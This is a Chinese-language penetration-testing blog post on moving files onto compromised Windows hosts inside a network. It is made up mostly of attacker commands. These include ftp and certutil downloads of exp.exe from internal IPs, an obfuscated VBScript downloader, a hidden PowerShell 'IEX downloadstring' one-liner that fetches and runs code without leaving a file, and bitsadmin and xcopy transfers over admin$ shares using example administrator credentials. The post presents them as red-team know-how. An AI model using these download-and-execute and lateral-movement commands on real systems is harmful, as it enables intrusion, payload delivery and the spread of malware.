# 005-内网文件传输技术 Windows篇


&lt;!--more--&gt;

本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil.exe、bitsadmin、Xcopy，都是些老技术，整理分享。

## 一、ftp

windows 全平台自带ftp，在实战中需要考虑两点。

- 数据传输的完整性。
- 代码精简

ftp文件的传输方式：

- Binary，二进制方式；
- ASCII，ASCII传输

在FTP文件传输过程中，ASCII传输HTML和文本编写的文件，而二进制码传输可以传送文本和非文本（执行文件，压缩文件，图片等），具有通用性，二进制码传输速度比ASCII传输要快。

命令：

```shell
 echo open 192.168.1.115 21&gt; ftp.txt 
 echo 123&gt;&gt; ftp.txt          # 用户名 
 echo 123&gt;&gt; ftp.txt          # 密码 
 echo binary &gt;&gt; ftp.txt  # bin模式，设置二进制传输类型 
 echo get robots.txt &gt;&gt; ftp.txt     # 接收指定文件 
 echo bye &gt;&gt; ftp.txt         # 终止ftp会话并退出，同quit  
 
 # 指定包含 FTP 命令的文本文件；命令在 FTP 启动后自动运行。 
 ftp -s:ftp.txt   
 del /F /Q ftp.txt             # 安静模式强制删除ftp文件
```

![图片](/resource/内网文件传输技术-Windows篇.assets/640.png)



精简成一句话

```shell
echo open IP &gt; o&amp;echo user UserName Password &gt;&gt; o &amp;echo get Target_File.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del /F /Q o  

# -A匿名登录下载文件 
echo open IP &gt; o &amp; echo get Target_File.exe &gt;&gt; o &amp;echo quit&gt;&gt;o &amp;ftp -A -n -s:o &amp; del /F /Q o
```



## 二、VBS

编写VBS脚本并保存

```vbscript
set a=createobject(&#34;adod&#34;&#43;&#34;b.stream&#34;):set w=createobject(&#34;micro&#34;&#43;&#34;soft.xmlhttp&#34;):w.open&#34;get&#34;,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2
```

也可以用echo方式写入vbs

```vbscript
 echo set a=createobject(^&#34;adod^&#34;&#43;^&#34;b.stream^&#34;):set w=createobject(^&#34;micro^&#34;&#43;^&#34;soft.xmlhttp^&#34;):w.open ^&#34;get^&#34;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; downfile.vbs
```

命令行下载

```
cscript downfile.vbs http://192.168.126.130:8000/flag.txt  C:\Inetpub\b.txt
```

![图片](/resource/内网文件传输技术-Windows篇.assets/640-20230220172700358.png)

也可以把参数直接写入vbs文件中，直接执行。

优点：支持windows全版本系列缺点：对https不友好

VBS作为一门代码语言，可以有多种代码编写的方式，不只这一种

## 三、Powershell

```shell
# 远程下载文件到本地： 
powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.183.138:8000/test.txt&#39;,&#39;test.exe&#39;)  

powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.111.1:8080/exp.exe&#39;,&#39;C:\Users\1day\Desktop\Tools\exp.exe&#39;) 
exp.exe  

# 直接把文本转换为exe文件运行，无残留文件 
powershell -nop -w hidden -c &#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.183.138:8000/test.txt&#39;))&#34;
```

## 四、certutil

Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。

```shell
certutil.exe -urlcache -split -f http://192.168.16.157/exp.exe 
# certutil.exe下载有个弊端，它的每一次下载都有留有缓存，所以每次下载后需要清除缓存 
certutil.exe -urlcache -split -f http://192.168.16.157/exp.exe delete //删除缓存 
exp.exe 

-URLCache             -- 显示或删除 URL 缓存项目 
-split                -- 分离嵌入的 ASN.1 元素，并保存到文件 
-f                    -- 强制覆盖

```

![图片](/resource/内网文件传输技术-Windows篇.assets/640-20230220172700839.png)

默认下载为bin文件。但是不影响在命令行下使用。

certutil还自带base64编码解码功能

```
 certutil -encode c:\downfile.vbs downfile.bat 
 certutil -decode c:\downfile.bat downfile.txt
```

## 五、bitsadmin

 BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度。 

 具体相关参数参见 官方文档：

```
USAGE: BITSADMIN [/RAWRETURN] [/WRAP | /NOWRAP] command 
The following commands are available:  

/?                Prints this help 
/UTIL  /?         打印实用程序命令列表 
/PEERCACHING /?   打印管理缓存的命令列表 
/CACHE /?         打印缓存管理命令 
/PEERS  /?        打印管道peer管理命令  

/LIST   [/ALLUSERS] [/VERBOSE]     打印任务列表 
/MONITOR [/ALLUSERS] [/REFRESH sec] 监控复制管理器 
/RESET   [/ALLUSERS]                删除所有任务  

/TRANSFER &lt;job name&gt; [type] [/PRIORITY priority] [/ACLFLAGS flags]
					remote_url local_name          传输一个或多个文件.
          [type] 为/DOWNLOAD或/UPLOAD; 默认为下载 
          可以指定多个 URL/文件对。local_name 只支持 绝对路径
```



```shell
bitsadmin /transfer 123 http://192.168.111.1:8080/exp.exe C:\Users\1day\Desktop\exp.exe

net use \\DC\admin$ /u:&#34;administrator&#34; &#34; 1qaz@WSX&#34;
bitsadmin /TRANSFER /DOWNLOAD \\WEB\admin$\temp\t.exe C:\windows\temp\t.exe

bitsadmin /TRANSFER /UPLOAD c:\windows\temp\t.exe \\WEB\admin$\temp\t.exe

```

![图片](/resource/内网文件传输技术-Windows篇.assets/640-20230220172700442.png)

bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自 动重试，在比较复杂的网络环境下，有着不错的性能。

```shell
E:\&gt;bitsadmin /rawreturn /transfer down &#34;http://192.168.1.115/robots.txt&#34; E:\PDF\robots.txt
/RAWRETURN                     返回数据更适合解析
```

需要注意的是，bitsadmin要求服务器支持Range标头。如果需要下载过大的文件，需要提高优先级。配合上面的下载命令。再次执行

```shell
bitsadmin /setpriority down foreground

/SETPRIORITY    &lt;job&gt; &lt;priority&gt;    # 设置工作优先级   
		Priority usage choices:      
				FOREGROUND
        HIGH
        NORMAL
        LOW
```



## 六 、Xcopy

Windows 自带命令，复制文件和目录树

```shell
# 建立网络会话
net use \\DC\admin$ /u:&#34;administrator&#34; &#34;password&#34;

# 从本地推到远端
xcopy /s /h /d /c /y C:\Windows\Temp\t.exe \\WEB\\admin$\temp\ 

# 从远端拉到本地
xcopy /s /h /d /c /y \\WEB\\admin$\temp\t.exe C:\Windows\Temp\ 

参数讲解：
XCOPY source [destination]
	source         指定要复制的文件。
	destination    指定新文件的位置和/或名称。
	/S             复制目录和子目录，不包括空目录。
	/H             也复制隐藏文件和系统文件。
	/D:m-d-y      复制在指定日期或指定日期以后更改的文件。如果没有提供日期，只复制那些源时间比目标时间新的文件。
	/C             即使有错误，也继续复制。
	/Y             取消提示以确认要覆盖现有目标文件。
```


---

> 作者: Xavier  
> URL: http://localhost:1313/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/  

